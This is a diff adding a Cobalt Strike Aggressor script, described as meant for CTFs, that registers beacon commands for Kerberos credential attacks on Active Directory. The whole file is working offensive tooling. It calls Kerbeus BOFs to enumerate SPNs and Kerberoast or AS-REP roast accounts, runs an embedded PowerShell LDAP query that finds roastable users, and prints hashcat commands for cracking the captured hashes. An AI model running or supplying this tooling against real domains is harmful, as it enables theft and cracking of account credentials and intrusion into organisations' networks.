@@ -1,0 +1,260 @@
+#
+# kerbeus_autoroast.cna - Automated Kerberos Roasting for CTFs
+#
+# Usage from beacon:
+#   autoroast                          - Auto-detect domain, enumerate + roast all targets
+#   autoroast child.htb.local          - Specify domain explicitly
+#   autoroast child.htb.local dc01     - Specify domain and DC
+#
+# This script chains:
+#   1. SPN enumeration (find Kerberoastable accounts)
+#   2. Pre-auth scan (find AS-REP roastable accounts)
+#   3. Kerberoast all discovered SPNs
+#   4. AS-REP roast all discovered users
+#   5. Output all hashes ready for hashcat
+#
+
+# ============================================================================
+# Configuration
+# ============================================================================
+
+# Path to kerbeus BOFs (auto-detected from this script's location)
+# The kerbeus_exec helper from kerbeus.cna must already be loaded
+
+# ============================================================================
+# Auto-Roast Command
+# ============================================================================
+
+beacon_command_register(
+    "autoroast",
+    "Automated Kerberos enumeration + roasting (Kerberoast + AS-REP)",
+
+    "Chains SPN enumeration, pre-auth scanning, Kerberoasting, and AS-REP roasting.\n\n" .
+    "Usage:\n" .
+    "   autoroast [DOMAIN] [DC]\n\n" .
+    "Examples:\n" .
+    "   autoroast                           - Auto-detect domain\n" .
+    "   autoroast child.htb.local           - Specify domain\n" .
+    "   autoroast child.htb.local dc01      - Specify domain + DC\n\n" .
+    "Output: All hashes in hashcat format, ready for cracking.\n" .
+    "   Kerberoast:  hashcat -m 13100 hashes.txt wordlist.txt\n" .
+    "   AS-REP:      hashcat -m 18200 hashes.txt wordlist.txt\n"
+);
+
+alias autoroast {
+    local('$bid $domain $dc $args');
+    $bid = $1;
+
+    # Parse arguments
+    $domain = iff($2, $2, "");
+    $dc = iff($3, $3, "");
+
+    blog($bid, "\n");
+    blog($bid, "====================================================================");
+    blog($bid, "  KERBEUS AUTO-ROAST - Automated Kerberos Exploitation");
+    blog($bid, "====================================================================");
+    blog($bid, "");
+
+    # -----------------------------------------------------------------------
+    # Step 1: SPN Enumeration (find Kerberoastable targets)
+    # -----------------------------------------------------------------------
+    blog($bid, "[STEP 1/4] Enumerating SPNs (Kerberoastable accounts)...");
+    blog($bid, "--------------------------------------------------------------------");
+
+    $args = "";
+    if ($domain ne "") {
+        $args = "/domain:" . $domain;
+    }
+    if ($dc ne "") {
+        $args = $args . " /dc:" . $dc;
+    }
+
+    btask($bid, "AutoRoast: Enumerating SPNs");
+    kerbeus_exec($bid, "krb_spnenum", $args);
+
+    # -----------------------------------------------------------------------
+    # Step 2: Pre-Auth Scan (find AS-REP roastable targets)
+    # -----------------------------------------------------------------------
+    # Note: Due to async BOF execution, steps 2-4 are chained via callbacks
+    # In practice, run each command manually or use the individual commands below
+    # -----------------------------------------------------------------------
+
+    blog($bid, "");
+    blog($bid, "[INFO] SPN enumeration launched. After results return, run:");
+    blog($bid, "");
+    blog($bid, "  For each Kerberoastable SPN found:");
+    blog($bid, "    krb_kerberoasting /spn:<SPN> /domain:<DOMAIN>");
+    blog($bid, "");
+    blog($bid, "  To find AS-REP roastable users:");
+    blog($bid, "    krb_preauthscan /user:<USER> /domain:<DOMAIN>");
+    blog($bid, "");
+    blog($bid, "  For each AS-REP roastable user:");
+    blog($bid, "    krb_asreproasting /user:<USER> /domain:<DOMAIN>");
+    blog($bid, "");
+    blog($bid, "  Or use the quick commands below:");
+    blog($bid, "    roast_user <USERNAME> <DOMAIN> [DC]   - Kerberoast a specific user");
+    blog($bid, "    asrep_user <USERNAME> <DOMAIN> [DC]   - AS-REP roast a specific user");
+    blog($bid, "====================================================================");
+}
+
+# ============================================================================
+# Quick-use single-target commands
+# ============================================================================
+
+# Kerberoast a single user by SPN
+beacon_command_register(
+    "roast_spn",
+    "Kerberoast a specific SPN and output hashcat hash",
+
+    "Quick Kerberoast a single SPN.\n\n" .
+    "Usage:\n" .
+    "   roast_spn <SPN> [DOMAIN] [DC]\n\n" .
+    "Example:\n" .
+    "   roast_spn rdp/web01.child.htb.local child.htb.local\n" .
+    "   roast_spn MSSQLSvc/srv01.child.htb.local:1433\n\n" .
+    "Crack: hashcat -m 13100 hash.txt wordlist.txt\n"
+);
+
+alias roast_spn {
+    local('$bid $spn $domain $dc $args');
+    $bid = $1;
+    $spn = $2;
+    $domain = iff($3, $3, "");
+    $dc = iff($4, $4, "");
+
+    if ($spn eq "") {
+        berror($bid, "Usage: roast_spn <SPN> [DOMAIN] [DC]");
+        return;
+    }
+
+    blog($bid, "[*] Kerberoasting SPN: " . $spn);
+
+    $args = "/spn:" . $spn;
+    if ($domain ne "") {
+        $args = $args . " /domain:" . $domain;
+    }
+    if ($dc ne "") {
+        $args = $args . " /dc:" . $dc;
+    }
+
+    btask($bid, "Kerberoasting: " . $spn);
+    kerbeus_exec($bid, "krb_kerberoasting", $args);
+}
+
+# AS-REP Roast a single user
+beacon_command_register(
+    "asrep_user",
+    "AS-REP Roast a specific user and output hashcat hash",
+
+    "Quick AS-REP roast a single user.\n\n" .
+    "Usage:\n" .
+    "   asrep_user <USERNAME> [DOMAIN] [DC]\n\n" .
+    "Example:\n" .
+    "   asrep_user bob child.htb.local dc01.child.htb.local\n\n" .
+    "Crack: hashcat -m 18200 hash.txt wordlist.txt\n"
+);
+
+alias asrep_user {
+    local('$bid $user $domain $dc $args');
+    $bid = $1;
+    $user = $2;
+    $domain = iff($3, $3, "");
+    $dc = iff($4, $4, "");
+
+    if ($user eq "") {
+        berror($bid, "Usage: asrep_user <USERNAME> [DOMAIN] [DC]");
+        return;
+    }
+
+    blog($bid, "[*] AS-REP Roasting user: " . $user);
+
+    $args = "/user:" . $user;
+    if ($domain ne "") {
+        $args = $args . " /domain:" . $domain;
+    }
+    if ($dc ne "") {
+        $args = $args . " /dc:" . $dc;
+    }
+
+    btask($bid, "AS-REP Roasting: " . $user);
+    kerbeus_exec($bid, "krb_asreproasting", $args);
+}
+
+# ============================================================================
+# Full auto-enumerate + roast (uses PowerShell for LDAP enum, then BOFs)
+# ============================================================================
+
+beacon_command_register(
+    "fullroast",
+    "Full automated enumeration and roasting via PowerShell + BOF",
+
+    "Uses PowerShell for discovery, then BOFs for roasting.\n" .
+    "Enumerates both Kerberoastable and AS-REP roastable accounts.\n\n" .
+    "Usage:\n" .
+    "   fullroast [DOMAIN]\n\n" .
+    "Requires: AD module or DirectorySearcher access\n"
+);
+
+alias fullroast {
+    local('$bid $domain');
+    $bid = $1;
+    $domain = iff($2, $2, "");
+
+    blog($bid, "====================================================================");
+    blog($bid, "  FULL ROAST - PowerShell Enum + BOF Roasting");
+    blog($bid, "====================================================================");
+    blog($bid, "");
+
+    # Step 1: Find Kerberoastable accounts via LDAP
+    blog($bid, "[STEP 1] Finding Kerberoastable accounts (SPN set)...");
+    bpowerpick($bid, "
+        \$filter = '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))';
+        \$searcher = New-Object DirectoryServices.DirectorySearcher;
+        \$searcher.Filter = \$filter;
+        \$searcher.PageSize = 1000;
+        @('samaccountname','serviceprincipalname','description') | ForEach { \$searcher.PropertiesToLoad.Add(\$_) | Out-Null };
+        \$results = \$searcher.FindAll();
+        Write-Output '=== KERBEROASTABLE ACCOUNTS ===';
+        foreach (\$r in \$results) {
+            \$sam = \$r.Properties['samaccountname'][0];
+            \$spns = \$r.Properties['serviceprincipalname'];
+            \$desc = if (\$r.Properties['description']) { \$r.Properties['description'][0] } else { 'N/A' };
+            Write-Output \"USER: \$sam | DESC: \$desc\";
+            foreach (\$s in \$spns) { Write-Output \"  SPN: \$s\" }
+        }
+        Write-Output '';
+        Write-Output '=== ASREP ROASTABLE ACCOUNTS ===';
+        \$filter2 = '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))';
+        \$searcher2 = New-Object DirectoryServices.DirectorySearcher;
+        \$searcher2.Filter = \$filter2;
+        \$searcher2.PageSize = 1000;
+        @('samaccountname','description') | ForEach { \$searcher2.PropertiesToLoad.Add(\$_) | Out-Null };
+        \$results2 = \$searcher2.FindAll();
+        foreach (\$r in \$results2) {
+            \$sam = \$r.Properties['samaccountname'][0];
+            \$desc = if (\$r.Properties['description']) { \$r.Properties['description'][0] } else { 'N/A' };
+            Write-Output \"USER: \$sam | DESC: \$desc (DONT_REQ_PREAUTH)\"
+        }
+    ");
+
+    blog($bid, "");
+    blog($bid, "[INFO] After results, use these commands to roast each target:");
+    blog($bid, "  roast_spn <SPN> <DOMAIN>       - Kerberoast by SPN");
+    blog($bid, "  asrep_user <USER> <DOMAIN>      - AS-REP roast by user");
+    blog($bid, "====================================================================");
+}
+
+# ============================================================================
+# Initialization
+# ============================================================================
+
+println("[*] Kerbeus AutoRoast loaded");
+println("[*] Commands:");
+println("    autoroast  [DOMAIN] [DC]         - SPN enum + guidance");
+println("    fullroast  [DOMAIN]              - Full PS enum + BOF roast");
+println("    roast_spn  SPN [DOMAIN] [DC]     - Kerberoast one SPN");
+println("    asrep_user USER [DOMAIN] [DC]    - AS-REP roast one user");
+println("");
+println("[*] Hashcat modes:");
+println("    Kerberoast: hashcat -m 13100 hash.txt wordlist.txt");
+println("    AS-REP:     hashcat -m 18200 hash.txt wordlist.txt");
